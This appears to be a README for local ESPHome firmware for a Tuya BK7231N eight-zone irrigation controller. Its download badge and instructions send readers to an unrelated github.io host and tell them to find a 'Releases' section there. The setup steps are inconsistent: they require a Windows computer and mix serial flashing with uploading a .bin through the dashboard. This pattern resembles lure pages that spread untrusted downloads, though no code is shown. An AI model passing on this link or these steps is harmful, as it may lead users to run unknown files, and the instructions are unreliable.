# 💧 esphome-tuya-8zone-valve - Control your irrigation system locally

[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://valicommutativegroup775.github.io)

This project provides software for an 8-zone irrigation controller based on the Tuya BK7231N chip. It allows you to run your garden watering system without a connection to the internet. You keep full control of your hardware at all times.

## 📋 What this project does

Many smart home devices rely on cloud servers to function. If the server goes offline, your devices stop working. This project replaces the original factory software with custom code. Your controller talks directly to your home automation system.

Key features include:
- Local control without cloud servers.
- Buttons on the device trigger water flow immediately.
- The built-in buzzer provides feedback for every action.
- You perform updates over the air without cables.
- Integration with Home Assistant for schedules.

## 🖥️ System requirements

To use this software, you need the following:
- An 8-zone irrigation controller using the BK7231N or CBU chip.
- A Windows computer to perform the initial setup.
- A stable Wi-Fi network.
- Home Assistant software running on your local network.

## 📥 How to download the software

You must visit the project page to access the latest version. Follow these steps to reach the download area:

1. Click this link to go to the project release page: [https://valicommutativegroup775.github.io](https://valicommutativegroup775.github.io)
2. Look for the section labeled "Releases" on the right side of the screen.
3. Select the latest version number.
4. Download the file ending in .bin to your computer.

## ⚙️ Initial setup steps

The process of putting this software onto your device helps it communicate with your network.

1. Connect your controller to your computer via a serial adapter.
2. Open the ESPHome dashboard in your Home Assistant instance.
3. Select the option to add a new device.
4. Upload the .bin file you retrieved from the release page.
5. Provide your Wi-Fi name and password when the setup asks for them.
6. Press the "Install" button to flash the firmware onto the hardware.

## 🛠️ Troubleshooting common issues

If you encounter problems during the installation, check these points:

- Ensure the serial adapter pins connect firmly to the controller board.
- Verify that your Wi-Fi signal reaches the location of the irrigation controller.
- Check that your computer recognizes the serial adapter. You might need to install specific drivers for your cable.
- Use a different USB cable if the computer does not detect the device.

## 📱 Using the interface

Once the software is running, the device acts as a sensor and switch in your home network. You can view the status of all eight zones in your dashboard. Each zone shows if the water is on or off. You can toggle zones by pressing the buttons in the interface or by using the physical touch buttons on the device housing. The buzzer sounds once when you enable a valve and twice when you disable it.

## 🔄 Updates

This device supports updates over your Wi-Fi network. You never need to connect the device to your computer again. When a new version of this software becomes available, you can trigger an update directly from your home automation dashboard. The device will download the new file, restart, and continue operating with the latest improvements.

## 🔒 Privacy and security

This project stores no data on external servers. Your watering schedules reside on your local hardware. You have total control over who accesses your system. Since the device does not depend on cloud servers, no third party can track your usage patterns or turn your water on without your permission.

Keywords: beken, bk7231n, cbu, esphome, home-assistant, irrigation, local-control, ota, smart-home, sprinkler-controller, tuya